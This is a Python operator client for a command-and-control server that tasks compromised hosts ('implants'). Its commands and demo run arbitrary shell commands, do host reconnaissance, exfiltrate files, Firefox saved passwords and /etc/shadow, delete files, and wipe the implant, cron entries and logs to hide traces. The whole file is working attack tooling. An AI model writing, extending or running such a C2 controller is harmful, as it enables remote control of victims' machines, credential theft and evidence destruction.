#!/usr/bin/env python3
import json
import os
import socket
import struct
import sys

C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
C2_OPERATOR_PORT = int(os.environ.get("C2_OPERATOR_PORT", "9998"))
C2_TOKEN = os.environ.get("OPERATOR_TOKEN", "changeme")


def _send(conn, data):
    conn.sendall(struct.pack(">I", len(data)) + data)


def _recv(conn):
    hdr = b""
    while len(hdr) < 4:
        c = conn.recv(4 - len(hdr))
        if not c:
            raise ConnectionError("closed")
        hdr += c
    length = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < length:
        c = conn.recv(length - len(buf))
        if not c:
            raise ConnectionError("closed")
        buf += c
    return buf


def _tx(sock, msg):
    _send(sock, json.dumps(msg).encode())
    return json.loads(_recv(sock).decode())


_HELP = """
Commands:
  list
  task <ID> RUN_CMD <shell command>
  task <ID> SYSINFO
  task <ID> RECON_BUNDLE            - full host recon (multi-step)
  task <ID> EXFIL_FILE <path>
  task <ID> FIREFOX_EXFIL          - exfil Firefox saved passwords (key4.db + logins.json)
  task <ID> SHADOW_EXFIL           - exfil /etc/shadow
  task <ID> DELETE_FILE <path>
  task <ID> HEARTBEAT
  task <ID> SHUTDOWN
  task <ID> DESTROY                 - wipe implant, init.d, crontab, logs, then self-kill
  quit / exit
"""


def _print_result(resp):
    status = resp.get("status")
    if status == "error":
        print("  ERROR: {0}".format(resp.get("message", resp)))
        return
    result = resp.get("result", {})
    # Catch implant-level errors (type=ERROR, no payload)
    if result.get("type") == "ERROR":
        err = result.get("error", {})
        print("  IMPLANT ERROR [{0}]: {1}".format(err.get("code", "?"), err.get("message", result)))
        return
    payload = result.get("payload", {})

    if "stdout" in payload:
        print("  stdout:     {0}".format(payload["stdout"] or "(empty)"))
        if payload.get("stderr"):
            print("  stderr:     {0}".format(payload["stderr"]))
        print("  returncode: {0}".format(payload.get("returncode")))
    elif "value" in payload:
        print("  value: {0}".format(payload["value"]))
    elif isinstance(payload, dict) and len(payload) > 3:
        # multi-key payload (RECON_BUNDLE, PERSIST, PRIVESC, SYSINFO)
        for k, v in payload.items():
            v_str = str(v)
            # truncate long values to avoid flooding the terminal
            if len(v_str) > 200:
                v_str = v_str[:200] + "... (truncated)"
            print("  {0:<20} {1}".format(k + ":", v_str))
    elif "message" in payload:
        print("  {0}".format(payload["message"]))
    else:
        print(json.dumps(payload, indent=2))


def _interactive(sock):
    print(_HELP.strip())
    while True:
        try:
            line = input("\nc2> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line:
            continue
        if line.lower() in ("quit", "exit"):
            break

        parts = line.split(None, 1)
        verb = parts[0].lower()

        if verb in ("help", "?"):
            print(_HELP.strip())

        elif verb == "list":
            resp = _tx(sock, {"action": "LIST"})
            implants = resp.get("implants", {})
            if not implants:
                print("  (no implants connected)")
            for iid, info in implants.items():
                print("  {0}   {1}".format(iid, info))

        elif verb == "task":
            rest = parts[1] if len(parts) > 1 else ""
            tparts = rest.split(None, 2)
            if len(tparts) < 2:
                print("  Usage: task <implant_id> <COMMAND> [args]")
                continue

            target = tparts[0]
            c2_cmd = tparts[1].upper()
            args = tparts[2] if len(tparts) > 2 else ""

            if c2_cmd == "RUN_CMD":
                payload = {"cmd": args}
            elif c2_cmd == "EXFIL_FILE":
                payload = {"path": args}
            elif c2_cmd == "DELETE_FILE":
                payload = {"path": args}
            elif c2_cmd in ("HEARTBEAT", "SYSINFO", "SHUTDOWN", "DESTROY",
                            "RECON_BUNDLE", "FIREFOX_EXFIL", "SHADOW_EXFIL"):
                payload = {}
            else:
                print("  Unknown command: {0}".format(c2_cmd))
                continue

            resp = _tx(sock, {"action": "TASK", "target": target, "command": c2_cmd, "payload": payload})
            _print_result(resp)

        else:
            print("  Unknown: {0!r}".format(verb))


def _demo(sock):
    print("OPERATOR DEMO\n")

    resp = _tx(sock, {"action": "LIST"})
    implants = list(resp.get("implants", {}).keys())
    print("[LIST] {0}".format(implants))

    if not implants:
        print("No implants connected.")
        return

    t = implants[0]
    print("Targeting: {0}\n".format(t))

    tasks = [
        ("HEARTBEAT",     {}),
        ("SYSINFO",       {}),
        ("RUN_CMD",       {"cmd": "whoami && id"}),
        ("RECON_BUNDLE",   {}),
        ("FIREFOX_EXFIL",  {}),
        ("SHADOW_EXFIL",   {}),
        ("EXFIL_FILE",     {"path": "/etc/hostname"}),
    ]

    for command, payload in tasks:
        try:
            resp = _tx(sock, {"action": "TASK", "target": t, "command": command, "payload": payload})
            result = resp.get("result", {}).get("payload", {})
            # summarize result to one line for demo output
            summary = (
                result.get("stdout")
                or result.get("value")
                or result.get("message")
                or result.get("crontab")
                or str(result)
            )
            print("  [{0:<14}]  {1}".format(command, str(summary)[:100]))
        except Exception as exc:
            print("  [{0:<14}]  ERROR: {1}".format(command, exc))

    print("\nDemo complete.")


def _connect():
    import time
    warned = False
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((C2_HOST, C2_OPERATOR_PORT))
            resp = _tx(sock, {"action": "AUTH", "token": C2_TOKEN})
            if resp.get("status") != "ok":
                print("[OPERATOR] Auth failed: {0}".format(resp.get("message")))
                sock.close()
                return None
            print("[OPERATOR] Authenticated.\n")
            return sock
        except (ConnectionRefusedError, OSError) as exc:
            if not warned:
                print("[OPERATOR] Waiting for C2 server...")
                warned = True
            time.sleep(3)


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "interactive"
    print("[OPERATOR] Connecting to {0}:{1}...".format(C2_HOST, C2_OPERATOR_PORT))

    if mode == "demo":
        sock = _connect()
        if sock:
            with sock:
                _demo(sock)
        return

    while True:
        sock = _connect()
        if sock is None:
            return
        try:
            with sock:
                _interactive(sock)
                return  # user typed quit/exit
        except (ConnectionError, OSError) as exc:
            print("\n[OPERATOR] Disconnected: {0} - reconnecting...".format(exc))


if __name__ == "__main__":
    main()
